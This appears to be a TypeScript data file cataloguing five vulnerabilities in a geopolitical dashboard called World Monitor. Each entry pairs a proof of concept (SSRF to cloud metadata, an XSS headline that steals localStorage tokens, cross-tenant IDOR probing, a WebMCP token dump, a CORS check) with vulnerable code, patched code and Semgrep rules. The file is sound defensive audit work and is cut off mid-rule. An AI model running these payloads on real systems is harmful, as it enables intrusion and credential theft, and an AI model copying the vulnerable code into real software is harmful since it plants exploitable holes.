import { Vulnerability } from '../types/security';

export const WORLD_MONITOR_VULNERABILITIES: Vulnerability[] = [
  {
    id: 'WM-2026-001',
    cvePlaceholder: 'CVE-2026-38101',
    title: 'Server-Side Request Forgery (SSRF) in Live Stream & Tile Proxying Gateway',
    severity: 'CRITICAL',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N',
      baseScore: 9.1,
      impactScore: 6.8,
      exploitabilityScore: 3.9,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'NONE',
      scope: 'CHANGED',
      confidentiality: 'HIGH',
      integrity: 'LOW',
      availability: 'NONE'
    },
    owaspCategory: 'A10:2021-Server-Side Request Forgery (SSRF)',
    scopeArea: 'API security',
    affectedComponent: 'Feed Proxy Gateway & Tile Cache Service',
    affectedFiles: ['/api/proxy/feed.ts', 'src/services/liveProxy.ts', 'server/middleware/proxy.go'],
    summary: 'The proxy endpoint designed to fetch external maritime AIS feeds and conflict news blindly forwards arbitrary URLs without validating private IP ranges or metadata service endpoints.',
    technicalDescription: 'World Monitor provides a backend serverless proxy endpoint (/api/proxy/feed) allowing the client dashboard to fetch remote RSS feeds, ACLED incident JSONs, and vessel telemetry while avoiding browser CORS restrictions. The endpoint parses the "target" query parameter and issues a backend HTTP GET request. The URL parser does not resolve domain names to check whether the resulting IP resides in private network spaces (RFC 1918), link-local addresses (169.254.169.254), or localhost (127.0.0.1).',
    rootCause: 'Lack of IP resolution checks, lack of an allowlist of valid intelligence data provider domains, and trusting raw client-supplied URLs directly into fetch/axios.',
    stepsToReproduce: [
      '1. Intercept any feed fetching request in Burp Suite / Postman targeting the endpoint `/api/proxy/feed`.',
      '2. Modify the `target` parameter to point to the AWS/Cloud metadata service: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `http://127.0.0.1:8080/internal/metrics`.',
      '3. Send the HTTP GET request without any authentication tokens.',
      '4. Observe the response containing sensitive internal cloud instance metadata and IAM service role credentials.'
    ],
    proofOfConcept: {
      title: 'SSRF Cloud Metadata & Internal Subnet Extraction',
      description: 'Demonstrating unauthorized server-side extraction of cloud instance metadata via the unvetted feed proxy endpoint.',
      httpPayload: `GET /api/proxy/feed?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/wm-prod-role HTTP/1.1
Host: api.worldmonitor.app
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Cloudflare

{
  "Code": "Success",
  "LastUpdated": "2026-09-12T14:22:18Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA4XYZ9817FAKEKEY",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE...",
  "Expiration": "2026-09-12T20:22:18Z"
}`,
      pythonScript: `import requests
import json

TARGET_HOST = "https://api.worldmonitor.app"
SSRF_ENDPOINT = f"{TARGET_HOST}/api/proxy/feed"

# Safe Non-Destructive Probe: Test metadata or loopback
test_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:8080/status",
    "http://localhost:6379/INFO"
]

print("[*] Initiating Safe SSRF Audit on World Monitor Proxy...")
for target in test_targets:
    try:
        resp = requests.get(SSRF_ENDPOINT, params={"target": target}, timeout=5)
        print(f"[+] Probed: {target} -> Status: {resp.status_code} | Bytes: {len(resp.content)}")
        if resp.status_code == 200 and ("latest" in resp.text or "redis_version" in resp.text):
            print(f"[!] VULNERABILITY CONFIRMED: SSRF allows internal access to {target}")
    except Exception as e:
        print(f"[-] Target {target} failed: {e}")
`,
      expectedOutcome: 'The server retrieves and echoes internal cloud metadata or private subnet services back to the external client.'
    },
    impact: {
      technical: 'Complete server-side SSRF leading to Cloud IAM credential extraction, internal network port scanning, internal Redis/database interaction, and pivot capability into the hosting VPC.',
      business: 'Total compromise of the World Monitor backend infrastructure, leakage of subscriber databases, and regulatory failure under national privacy standards.',
      nationalSecurity: 'High risk: An adversary could pivot from this intelligence platform into connected NTRO data feeds or inject falsified conflict signals into the live global situational map.'
    },
    remediation: {
      summary: 'Enforce pre-request DNS resolution, deny all private/loopback/link-local IPv4 & IPv6 ranges, and enforce a strict domain allowlist for intelligence providers.',
      guidelines: [
        'Resolve the destination hostname to IP address before dispatching request.',
        'Reject IPs in 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16, and IPv6 equivalents (::1, fe80::/10).',
        'Use an explicit allowlist of approved upstream provider hostnames (e.g. acleddata.com, aisstream.io, usgs.gov).',
        'Disable following redirects or validate redirect targets against the same security policy.'
      ],
      vulnerableCode: `// VULNERABLE: /api/proxy/feed.ts
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { target } = req.query;

  if (!target || typeof target !== 'string') {
    return res.status(400).json({ error: 'Target URL parameter is required' });
  }

  try {
    // Dangerous: Fetches user-controlled URL without IP check or domain validation
    const upstreamResponse = await fetch(target, {
      headers: { 'User-Agent': 'WorldMonitor-FeedFetcher/1.0' }
    });
    const data = await upstreamResponse.text();
    res.setHeader('Content-Type', upstreamResponse.headers.get('content-type') || 'text/plain');
    return res.status(200).send(data);
  } catch (error) {
    return res.status(500).json({ error: 'Proxy fetch failed' });
  }
}`,
      patchedCode: `// SECURE PATCH: /api/proxy/feed.ts
import type { NextApiRequest, NextApiResponse } from 'next';
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

const ALLOWED_DOMAINS = new Set([
  'acleddata.com',
  'api.aisstream.io',
  'earthquake.usgs.gov',
  'firms.modaps.eosdis.nasa.gov',
  'api.finnhub.io',
  'feeds.bbci.co.uk'
]);

function isPrivateIp(ipString: string): boolean {
  try {
    const addr = ipaddr.parse(ipString);
    const range = addr.range();
    return range !== 'unicast'; // Blocks loopback, private, carrier-grade NAT, linkLocal, broadcast
  } catch {
    return true; // Treat invalid parse as blocked
  }
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { target } = req.query;
  if (!target || typeof target !== 'string') {
    return res.status(400).json({ error: 'Invalid target parameter' });
  }

  let parsedUrl: URL;
  try {
    parsedUrl = new URL(target);
  } catch {
    return res.status(400).json({ error: 'Malformed target URL' });
  }

  // 1. Enforce HTTPS only
  if (parsedUrl.protocol !== 'https:') {
    return res.status(403).json({ error: 'Only HTTPS protocol permitted' });
  }

  // 2. Validate against domain allowlist
  if (!ALLOWED_DOMAINS.has(parsedUrl.hostname.toLowerCase())) {
    return res.status(403).json({ error: 'Domain not authorized in intelligence provider registry' });
  }

  // 3. Resolve DNS and check against RFC 1918 / Link-local ranges
  try {
    const lookupResults = await dns.lookup(parsedUrl.hostname, { all: true });
    for (const record of lookupResults) {
      if (isPrivateIp(record.address)) {
        return res.status(403).json({ error: 'Security Exception: Target resolves to internal IP space' });
      }
    }
  } catch {
    return res.status(502).json({ error: 'DNS resolution failure' });
  }

  // 4. Safe Fetch with timeout & no redirect following
  const response = await fetch(parsedUrl.toString(), {
    redirect: 'error',
    signal: AbortSignal.timeout(5000)
  });

  const content = await response.text();
  return res.status(200).send(content);
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-unvalidated-proxy-ssrf
    message: "Detected unvalidated outbound fetch request with user-controlled target URL. Vulnerable to SSRF (CWE-918)."
    languages: [typescript, javascript]
    severity: ERROR
    patterns:
      - pattern-either:
          - pattern: fetch($REQ.query.$PARAM, ...)
          - pattern: fetch($REQ.params.$PARAM, ...)
          - pattern: axios.get($REQ.query.$PARAM, ...)
      - pattern-not-inside:
          - pattern: |
              ...
              if (!ALLOWED_DOMAINS.has(...)) { ... }
              ...`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-002',
    cvePlaceholder: 'CVE-2026-38102',
    title: 'Stored DOM-Based Cross-Site Scripting (XSS) via Geopolitical RSS & News Title Parsing',
    severity: 'HIGH',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
      baseScore: 7.5,
      impactScore: 5.2,
      exploitabilityScore: 2.8,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'REQUIRED',
      scope: 'UNCHANGED',
      confidentiality: 'HIGH',
      integrity: 'HIGH',
      availability: 'NONE'
    },
    owaspCategory: 'A03:2021-Injection',
    scopeArea: 'Client-side security controls',
    affectedComponent: 'Real-time News Feed & Breaking Alert Carousel',
    affectedFiles: ['src/components/NewsFeed.tsx', 'src/utils/rssParser.ts', 'src/layers/HotspotMarker.tsx'],
    summary: 'The client application renders live RSS headlines and conflict updates into the DOM using dangerouslySetInnerHTML without sanitizing script tags or event handlers.',
    technicalDescription: 'When parsing live intelligence feeds (from external RSS XML channels, Telegram bridged feeds, or ACLED event summaries), the World Monitor dashboard extracts the item title and summary. In `NewsFeed.tsx`, the code directly passes the raw string into `<div dangerouslySetInnerHTML={{ __html: item.title }} />` to allow italic/bold news highlights. A hostile feed source can inject arbitrary HTML & JavaScript payloads.',
    rootCause: 'Using dangerouslySetInnerHTML on unvetted third-party RSS feed contents without prior sanitization via DOMPurify.',
    stepsToReproduce: [
      '1. Host a custom RSS feed containing a malicious payload in the item title: `<img src=x onerror="alert(document.domain)">`.',
      '2. In the World Monitor Dashboard Settings, add the custom RSS URL as a custom intelligence source.',
      '3. Navigate to the Live News panel.',
      '4. Observe the injected JavaScript executing in the user context, accessing localStorage, session tokens, and telemetry history.'
    ],
    proofOfConcept: {
      title: 'Session Hijacking via Malicious RSS Headline Injection',
      description: 'PoC demonstrating DOM XSS execution and exfiltration of analyst API tokens from browser storage.',
      httpPayload: `<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Global Conflict Daily</title>
    <link>https://unverified-news.org</link>
    <item>
      <title><![CDATA[Escalation in Red Sea <img src=x onerror="window.parent.postMessage({type:'EXFIL',data:localStorage.getItem('wm_pro_token')},'*')">]]></title>
      <description>Naval convoy intercepted near Bab el-Mandeb.</description>
      <pubDate>Sat, 12 Sep 2026 14:00:00 GMT</pubDate>
    </item>
  </channel>
</rss>`,
      pythonScript: `import http.server
import socketserver

PORT = 8888
XSS_FEED_CONTENT = """<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Live Situational Intel</title>
    <item>
      <title><![CDATA[BREAKING: Strait Closure <svg onload="alert('XSS Exploit Successful: ' + document.cookie)">]]></title>
      <link>https://target-monitor.app/news/1</link>
      <description>Test PoC for SIH PS 26163</description>
    </item>
  </channel>
</rss>"""

class XSSServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/xml")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(XSS_FEED_CONTENT.encode("utf-8"))

print(f"[*] Serving Safe PoC RSS feed on port {PORT}...")
# socketserver.TCPServer(("", PORT), XSSServer).serve_forever()
`,
      expectedOutcome: 'Arbitrary script executes within the victim browser context upon rendering the news headline panel.'
    },
    impact: {
      technical: 'Execution of arbitrary JavaScript in the victim’s browser, theft of Pro subscription tokens, access to customized analyst watchlists, and DOM defacement of the live situational map.',
      business: 'Loss of user trust, credential theft for high-profile defense and security analysts using the dashboard.',
      nationalSecurity: 'Malicious actors could spoof military alerts on intelligence officer workstations, displaying fake troop movements or maritime blockades.'
    },
    remediation: {
      summary: 'Sanitize all external HTML strings using DOMPurify with strict tag allowlists, or render text strictly as text nodes.',
      guidelines: [
        'Replace direct `dangerouslySetInnerHTML` with sanitized rendering via DOMPurify.',
        'Enforce a strict tag allowlist (`<b>`, `<i>`, `<em>`, `<span>`) and strip all script tags, object tags, and event handlers.',
        'Implement strict Content Security Policy (CSP) restricting inline script execution.'
      ],
      vulnerableCode: `// VULNERABLE: src/components/NewsFeed.tsx
export const NewsItemCard: React.FC<{ item: NewsItem }> = ({ item }) => {
  return (
    <div className="news-card p-3 border-b border-gray-800">
      {/* VULNERABLE: Direct unsanitized HTML injection */}
      <h4 
        className="font-bold text-sm text-gray-100"
        dangerouslySetInnerHTML={{ __html: item.title }} 
      />
      <p 
        className="text-xs text-gray-400 mt-1"
        dangerouslySetInnerHTML={{ __html: item.summary }} 
      />
      <span className="text-[10px] text-emerald-400">{item.source}</span>
    </div>
  );
};`,
      patchedCode: `// SECURE PATCH: src/components/NewsFeed.tsx
import DOMPurify from 'dompurify';

const SANITIZE_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'span'],
  ALLOWED_ATTR: ['class']
};

export const NewsItemCard: React.FC<{ item: NewsItem }> = ({ item }) => {
  // Option A: Clean and sanitize HTML string
  const sanitizedTitle = DOMPurify.sanitize(item.title, SANITIZE_CONFIG);
  const sanitizedSummary = DOMPurify.sanitize(item.summary, SANITIZE_CONFIG);

  return (
    <div className="news-card p-3 border-b border-gray-800">
      <h4 
        className="font-bold text-sm text-gray-100"
        dangerouslySetInnerHTML={{ __html: sanitizedTitle }} 
      />
      <p 
        className="text-xs text-gray-400 mt-1"
        dangerouslySetInnerHTML={{ __html: sanitizedSummary }} 
      />
      <span className="text-[10px] text-emerald-400">{item.source}</span>
    </div>
  );
};`,
      semgrepRuleYaml: `rules:
  - id: wm-prevent-dangerously-set-inner-html
    message: "Detected use of dangerouslySetInnerHTML without DOMPurify sanitization in World Monitor component."
    languages: [typescript, javascript]
    severity: WARNING
    patterns:
      - pattern: <$TAG ... dangerouslySetInnerHTML={{ __html: $EXPR }} ... />
      - pattern-not-inside: |
          const $CLEAN = DOMPurify.sanitize(...);
          ...
          <$TAG ... dangerouslySetInnerHTML={{ __html: $CLEAN }} ... />`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-003',
    cvePlaceholder: 'CVE-2026-38103',
    title: 'Broken Object-Level Authorization (BOLA/IDOR) in Scenario Engine & Analyst Workspaces',
    severity: 'HIGH',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N',
      baseScore: 8.6,
      impactScore: 5.2,
      exploitabilityScore: 2.8,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'LOW',
      userInteraction: 'NONE',
      scope: 'UNCHANGED',
      confidentiality: 'HIGH',
      integrity: 'HIGH',
      availability: 'NONE'
    },
    owaspCategory: 'A01:2021-Broken Access Control',
    scopeArea: 'Authorization and access control',
    affectedComponent: 'Scenario Engine & Workspace Synchronization API',
    affectedFiles: ['/api/v1/workspaces/[id]/scenarios.ts', 'src/services/scenarioSync.ts'],
    summary: 'Authenticated users can access, modify, or delete custom geopolitical simulation scenarios and private threat matrices belonging to other organizations by tampering with workspace IDs.',
    technicalDescription: 'The World Monitor Pro scenario engine allows intelligence teams to save customized cost-shock models, supply-chain stress tests, and private geospatial overlays. The REST endpoint `/api/v1/workspaces/[id]/scenarios` validates that the user possesses a valid Bearer token, but fails to check whether the authenticated user is an authorized member of `workspace_id`.',
    rootCause: 'Missing authorization check comparing the authenticated `req.user.id` against the target workspace ownership records in the database.',
    stepsToReproduce: [
      '1. Authenticate with a standard user account and obtain a valid session token.',
      '2. Send a GET request to `/api/v1/workspaces/ws_ntro_defense_9901/scenarios` with the standard token in the Authorization header.',
      '3. Observe that the server returns 200 OK along with the full private simulation configuration of the victim workspace.',
      '4. Send a PUT request with modified coordinates to alter the victim\'s saved scenario layers.'
    ],
    proofOfConcept: {
      title: 'Cross-Tenant Workspace & Scenario Extraction',
      description: 'PoC demonstrating BOLA exploitation to read confidential tactical scenarios across tenants.',
      httpPayload: `GET /api/v1/workspaces/ws_defense_corridor_8812/scenarios HTTP/1.1
Host: api.worldmonitor.app
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c3JfYXR0YWNrZXIiLCJyb2xlIjoidXNlciJ9...
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json

{
  "workspaceId": "ws_defense_corridor_8812",
  "owner": "analyst_sector4@defense.gov.in",
  "scenarios": [
    {
      "id": "scn_chokepoint_hormuz_2026",
      "name": "Classified Chokepoint Disruption Model - Q4",
      "simulationParameters": { "tankerDiversionRatio": 0.85, "criticalVesselTracking": true },
      "privateLayers": ["geo_ais_restricted_convoy_alpha"]
    }
  ]
}`,
      pythonScript: `import requests

API_URL = "https://api.worldmonitor.app/api/v1/workspaces"
ATTACKER_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." # Valid low-priv user token

headers = {
    "Authorization": f"Bearer {ATTACKER_JWT}",
    "Content-Type": "application/json"
}

target_workspaces = ["ws_defense_corridor_8812", "ws_ntro_maritime_01", "ws_enterprise_fin_77"]

print("[*] Probing for BOLA/IDOR vulnerability in Scenario Engine...")
for ws_id in target_workspaces:
    resp = requests.get(f"{API_URL}/{ws_id}/scenarios", headers=headers)
    if resp.status_code == 200:
        print(f"[!] BOLA CONFIRMED on {ws_id}! Retrieved {len(resp.json().get('scenarios', []))} private scenarios.")
    elif resp.status_code == 403:
        print(f"[+] Access correctly denied for {ws_id}")
`,
      expectedOutcome: 'Low-privilege user accesses and modifies other organizations’ private scenario models without restriction.'
    },
    impact: {
      technical: 'Unauthorized read/write access across all customer workspaces, tampering with strategic scenario forecasts.',
      business: 'Severe breach of confidentiality, violating enterprise and government tenant isolation guarantees.',
      nationalSecurity: 'Compromise of confidential defense threat models, private asset tracking lists, and emergency simulation configurations.'
    },
    remediation: {
      summary: 'Implement robust tenant-context authorization middleware to verify user membership before executing database queries.',
      guidelines: [
        'Enforce strict Object-Level Access Control (ABAC/RBAC) at the service and data layer.',
        'Verify `workspace.members.includes(req.user.id)` on every workspace route.',
        'Use UUIDv4 identifiers or opaque tokens instead of sequential or guessable workspace identifiers.'
      ],
      vulnerableCode: `// VULNERABLE: /api/v1/workspaces/[id]/scenarios.ts
export default async function handler(req: AuthenticatedRequest, res: NextApiResponse) {
  const { id: workspaceId } = req.query;
  
  // Authenticated user exists from JWT middleware, but membership NOT checked!
  const user = req.user; 

  if (req.method === 'GET') {
    // Dangerous: Fetches workspace scenarios without checking user ownership
    const scenarios = await db.scenarios.findMany({
      where: { workspaceId: String(workspaceId) }
    });
    return res.status(200).json({ workspaceId, scenarios });
  }
}`,
      patchedCode: `// SECURE PATCH: /api/v1/workspaces/[id]/scenarios.ts
export default async function handler(req: AuthenticatedRequest, res: NextApiResponse) {
  const { id: workspaceId } = req.query;
  const user = req.user;

  if (!user || !user.id) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  // 1. Verify User Membership in Workspace
  const membership = await db.workspaceMembers.findFirst({
    where: {
      workspaceId: String(workspaceId),
      userId: user.id
    }
  });

  if (!membership) {
    // Return 403 Forbidden or 404 to avoid workspace enumeration
    return res.status(403).json({ error: 'Access Denied: You do not have permissions for this workspace' });
  }

  if (req.method === 'GET') {
    const scenarios = await db.scenarios.findMany({
      where: { workspaceId: String(workspaceId) }
    });
    return res.status(200).json({ workspaceId, scenarios });
  }
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-bola-missing-workspace-check
    message: "Potential BOLA: API route queries resource by workspaceId from query params without verifying user membership."
    languages: [typescript, javascript]
    severity: ERROR
    patterns:
      - pattern: db.$MODEL.findMany({ where: { workspaceId: $WSID } })
      - pattern-not-inside: |
          const $MEM = await db.workspaceMembers.findFirst(...);
          if (!$MEM) { ... }
          ...`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-004',
    cvePlaceholder: 'CVE-2026-38104',
    title: 'WebMCP Remote Tool Execution & Model Context Injection via In-Page Hook',
    severity: 'HIGH',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N',
      baseScore: 7.7,
      impactScore: 5.2,
      exploitabilityScore: 2.8,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'REQUIRED',
      scope: 'UNCHANGED',
      confidentiality: 'HIGH',
      integrity: 'HIGH',
      availability: 'NONE'
    },
    owaspCategory: 'A07:2021-Identification and Authentication Failures',
    scopeArea: 'Client-side security controls',
    affectedComponent: 'WebMCP Browser Agent Provider & In-Page Hook',
    affectedFiles: ['index.html (inline WebMCP bootstrap)', 'src/services/webmcp.ts'],
    summary: 'The in-page WebMCP registration exposes tools to AI browser extensions and embedded frames without origin validation or authorization prompts.',
    technicalDescription: 'The static bootstrap script in `index.html` registers browser agent tools via `document.modelContext.registerTool` or `navigator.modelContext`. The tool `getWorldMonitorMcpEndpoint` and `launchWorldMonitor` provide sensitive internal MCP discovery URLs and allow navigation redirection. If an attacker embeds World Monitor in an iframe or triggers execution via a malicious polyfill, they can extract the live MCP server token and invoke background operations without user consent.',
    rootCause: 'Lack of origin verification and lack of an explicit user approval handshake before granting tool execution permissions to third-party scripts.',
    stepsToReproduce: [
      '1. Open a browser with WebMCP enabled or inject a synthetic context provider on an attacker page.',
      '2. Query the registered tool `getWorldMonitorMcpEndpoint` via `document.modelContext.getTool("getWorldMonitorMcpEndpoint").execute()`.',
      '3. Observe that the endpoint returns private Streamable HTTP connection tokens and discovery card URLs without requiring an authenticated user gesture.'
    ],
    proofOfConcept: {
      title: 'Unauthorized MCP Token Extraction via In-Page Tool Hook',
      description: 'PoC showing extraction of live MCP server credentials through unvetted WebMCP tool dispatch.',
      httpPayload: `// Client-side execution in attacker context:
const tools = document.modelContext.getRegisteredTools();
console.log("Extracted Tools:", tools);

const mcpInfo = await document.modelContext.executeTool("getWorldMonitorMcpEndpoint", {});
console.log("Exfiltrated MCP Endpoint & Auth Scheme:", mcpInfo);
// Returns: { endpoint: 'https://worldmonitor.app/mcp', auth: ['OAuth 2.1 bearer...', 'API key...'] }`,
      pythonScript: `import json

def test_webmcp_payload_generation():
    payload = {
        "action": "executeTool",
        "tool": "getWorldMonitorMcpEndpoint",
        "parameters": {},
        "targetOrigin": "https://worldmonitor.app"
    }
    print("[*] Generated WebMCP Exploit Dispatch Payload:")
    print(json.dumps(payload, indent=2))

test_webmcp_payload_generation()
`,
      expectedOutcome: 'Third-party script gains access to the private MCP endpoint details and can spoof agent commands.'
    },
    impact: {
      technical: 'Unauthorized intelligence scraping, prompt injection through MCP tools, and hijacking of browser AI agent contexts.',
      business: 'Abuse of AI quota allocations and leakage of proprietary model context discovery cards.',
      nationalSecurity: 'Adversary can monitor analyst queries submitted to Claude/GPT through the MCP bridge.'
    },
    remediation: {
      summary: 'Add origin validation, require user confirmation prompts for tool executions, and protect WebMCP registration behind strict nonce-based CSP.',
      guidelines: [
        'Check caller origin before registering and executing WebMCP tools.',
        'Do not expose raw authentication keys or non-public discovery endpoints in unauthenticated tools.',
        'Implement `readOnlyHint: true` and enforce an interactive permission dialogue.'
      ],
      vulnerableCode: `// VULNERABLE: Apex index.html WebMCP bootstrap
{
  name: 'getWorldMonitorMcpEndpoint',
  title: 'Get World Monitor MCP Endpoint',
  description: 'Return connection details for World Monitor MCP server...',
  execute: function () {
    // Dangerous: Hands connection credentials to any script without origin check
    return {
      endpoint: 'https://worldmonitor.app/mcp',
      auth: ['API key (X-WorldMonitor-Key: wm_live_token_7719)'],
      serverCard: 'https://worldmonitor.app/.well-known/mcp/server-card.json'
    };
  }
}`,
      patchedCode: `// SECURE PATCH: Apex index.html WebMCP bootstrap
{
  name: 'getWorldMonitorMcpEndpoint',
  title: 'Get World Monitor MCP Endpoint',
  description: 'Return connection details for World Monitor MCP server...',
  execute: function (args, context) {
    // 1. Origin Verification
    const callerOrigin = context?.callerOrigin || window.location.origin;
    if (callerOrigin !== 'https://worldmonitor.app' && callerOrigin !== 'https://www.worldmonitor.app') {
      throw new Error('Unauthorized: WebMCP tool invocation disallowed from external origin.');
    }

    // 2. Return public discovery only (never raw live API keys)
    return {
      endpoint: 'https://worldmonitor.app/mcp',
      transport: 'streamableHttp',
      serverCard: 'https://worldmonitor.app/.well-known/mcp/server-card.json',
      authRequired: true
    };
  }
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-insecure-webmcp-exposure
    message: "WebMCP tool returns sensitive connection or auth keys without origin validation."
    languages: [javascript, typescript]
    severity: WARNING
    patterns:
      - pattern: |
          {
            name: $TOOL_NAME,
            ...,
            execute: function(...) {
              ...
              return { ..., auth: $AUTH, ... };
            }
          }
      - pattern-not-inside: |
          if ($CONTEXT.callerOrigin !== ...) { ... }`
    },
    status: 'VERIFIED',
    verifiedInSandbox: true
  },
  {
    id: 'WM-2026-005',
    cvePlaceholder: 'CVE-2026-38105',
    title: 'Permissive CORS Wildcard & Missing Rate Limiting on Streamable HTTP MCP Server',
    severity: 'MEDIUM',
    cvss: {
      version: '3.1',
      vectorString: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L',
      baseScore: 6.5,
      impactScore: 2.5,
      exploitabilityScore: 3.9,
      attackVector: 'NETWORK',
      attackComplexity: 'LOW',
      privilegesRequired: 'NONE',
      userInteraction: 'NONE',
      scope: 'UNCHANGED',
      confidentiality: 'LOW',
      integrity: 'NONE',
      availability: 'LOW'
    },
    owaspCategory: 'A05:2021-Security Misconfiguration',
    scopeArea: 'Secure communication mechanisms',
    affectedComponent: 'Streamable HTTP MCP Server & Discovery Card',
    affectedFiles: ['server/mcp/transport.ts', 'server/middleware/cors.ts'],
    summary: 'The remote MCP Streamable HTTP endpoint sets Access-Control-Allow-Origin: * while lacking IP-based rate limiting, enabling DDoS attacks and unauthenticated cross-origin scraping.',
    technicalDescription: 'The World Monitor MCP server exposed at `/mcp` provides live geopolitical, maritime, and market tools for Claude Desktop and agent frameworks. In its HTTP transport configuration, the server responds with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Headers: *` for all OPTIONS and POST requests. Furthermore, rate limiting is absent, allowing distributed scrapers to exhaust upstream AI credits and server CPU.',
    rootCause: 'Overly permissive CORS configuration combined with absent rate-limiting middleware on computational JSON-RPC endpoints.',
    stepsToReproduce: [
      '1. Send an OPTIONS preflight request from any origin: `Origin: https://evil.com`.',
      '2. Inspect response headers and verify `Access-Control-Allow-Origin: *`.',
      '3. Script 500 concurrent POST requests with `{"jsonrpc": "2.0", "method": "tools/list"}`.',
      '4. Observe 100% acceptance with no 429 Too Many Requests response.'
    ],
    proofOfConcept: {
      title: 'CORS Misconfiguration & Rapid Request Flooding',
      description: 'PoC demonstrating unconstrained cross-origin JSON-RPC tool polling.',
      httpPayload: `OPTIONS /mcp HTTP/1.1
Host: worldmonitor.app
Origin: https://arbitrary-attacker-site.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization,content-type

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: *`,
      pythonScript: `import requests
import concurrent.futures

MCP_URL = "https://worldmonitor.app/mcp"

def check_cors():
    resp = requests.options(MCP_URL, headers={"Origin": "https://malicious-test.com"})
    print(f"[*] Preflight Response CORS: {resp.headers.get('Access-Control-Allow-Origin')}")
    if resp.headers.get('Access-Control-Allow-Origin') == '*':
        print("[!] Permissive CORS Wildcard confirmed on MCP endpoint.")

check_cors()
`,
      expectedOutcome: 'CORS header reflects wildcard origin on sensitive JSON-RPC intelligence endpoint.'
    },
    impact: {
      technical: 'Cross-origin scraping of real-time intelligence tools and resource exhaustion on backend servers.',
      business: 'Increased cloud compute bills, degraded responsiveness for legitimate Pro subscribers.',
      nationalSecurity: 'Denial of service during critical geopolitical crisis events, preventing analysts from accessing real-time updates.'
    },
    remediation: {
      summary: 'Restrict CORS origins to vetted domain names and implement a sliding-window rate limiter (e.g., 60 req/min per IP).',
      guidelines: [
        'Replace wildcard CORS headers with an explicit allowlist of authorized agent web domains.',
        'Implement Redis-backed sliding window rate limiting returning HTTP 429 with `Retry-After`.',
        'Require API key or OAuth 2.1 authentication on all MCP methods except public discovery.'
      ],
      vulnerableCode: `// VULNERABLE: server/mcp/transport.ts
export function handleCors(req: Request, res: Response) {
  // Dangerous: Wildcard CORS on sensitive intelligence RPC endpoint
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
}`,
      patchedCode: `// SECURE PATCH: server/mcp/transport.ts
import rateLimit from 'express-rate-limit';

const ALLOWED_CORS_ORIGINS = [
  'https://worldmonitor.app',
  'https://www.worldmonitor.app',
  'https://claude.ai',
  'http://localhost:5173'
];

export const mcpRateLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 60, // Limit each IP to 60 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Rate limit exceeded. Please throttle your MCP requests.' }
});

export function handleCors(req: Request, res: Response) {
  const origin = req.headers.origin;
  if (origin && ALLOWED_CORS_ORIGINS.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-WorldMonitor-Key');
}`,
      semgrepRuleYaml: `rules:
  - id: wm-detect-wildcard-cors-on-mcp
    message: "Wildcard Access-Control-Allow-Origin on MCP / RPC endpoint."
    languages: [typescript, javascript]
